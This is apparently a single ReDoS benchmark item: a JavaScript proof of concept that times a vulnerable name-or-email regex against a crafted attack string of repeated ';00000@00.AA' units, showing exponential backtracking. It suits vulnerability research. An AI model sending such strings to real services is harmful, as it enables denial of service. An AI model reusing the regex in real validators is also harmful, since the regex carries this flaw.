/* 8543
 * ^((([a-zA-Z\'\.\-]+)?)((,\s*([a-zA-Z]+))?)|([A-Za-z0-9](([_\.\-]?[a-zA-Z0-9]+)*)@([A-Za-z0-9]+)(([\.\-]?[a-zA-Z0-9]+)*)\.([A-Za-z]{2,})))(;{1}(((([a-zA-Z\'\.\-]+){1})((,\s*([a-zA-Z]+))?))|([A-Za-z0-9](([_\.\-]?[a-zA-Z0-9]+)*)@([A-Za-z0-9]+)(([\.\-]?[a-zA-Z0-9]+)*)\.([A-Za-z]{2,})){1}))*$
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:""+";00000@00.AA"*8+"!1 __EOA(i or ii)"
 */
var REGEX = /^((([a-zA-Z\'\.\-]+)?)((,\s*([a-zA-Z]+))?)|([A-Za-z0-9](([_\.\-]?[a-zA-Z0-9]+)*)@([A-Za-z0-9]+)(([\.\-]?[a-zA-Z0-9]+)*)\.([A-Za-z]{2,})))(;{1}(((([a-zA-Z\'\.\-]+){1})((,\s*([a-zA-Z]+))?))|([A-Za-z0-9](([_\.\-]?[a-zA-Z0-9]+)*)@([A-Za-z0-9]+)(([\.\-]?[a-zA-Z0-9]+)*)\.([A-Za-z]{2,})){1}))*$/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '' + ';00000@00.AA'.repeat(i*1) + '!1 __EOA(i or ii)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}